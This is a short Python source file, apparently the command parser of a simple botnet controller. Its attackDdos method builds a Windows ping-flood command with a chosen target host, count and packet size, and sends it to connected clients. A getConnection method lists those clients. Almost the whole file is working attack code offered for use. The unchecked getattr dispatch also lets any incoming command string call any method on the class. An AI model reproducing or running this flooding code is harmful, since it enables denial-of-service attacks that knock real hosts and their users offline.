from Functions import setMessage, getConnections
class Parser:
    
    def execCommand(self, command):
        array = command.split(' ')
        getRealCommand = array[0]      
        array.remove(getRealCommand)
        try:
            return getattr(self, getRealCommand)(array)
        except(AttributeError):
            return "Command not Found"  
        
    def attackDdos(self,array):
        canonicalName = array[0]
        times = array[1]
        packageWeight = array[2]
        
        setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight), False)
        
    def getConnection(self):
        print(getConnections())